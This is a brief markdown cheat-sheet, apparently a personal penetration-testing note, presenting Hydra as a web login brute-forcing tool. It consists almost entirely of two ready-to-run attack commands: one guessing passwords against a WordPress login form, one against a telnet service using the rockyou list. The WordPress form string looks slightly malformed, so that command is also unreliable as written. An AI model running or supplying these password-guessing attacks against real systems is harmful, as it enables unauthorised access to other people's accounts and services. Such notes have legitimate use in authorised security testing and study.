---
tags:
  - web
  - security
---
A tool to brute force logins on the web
# Brute Force URL
```
hydra -l <user> -P passwords.txt domain.com http-post-form "/?wp-login.php:log=^USER&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -v
```
# Brute Force Telnet
```
hydra -L users.txt -P rockyou.txt -t 4 -f <ip> telnet
```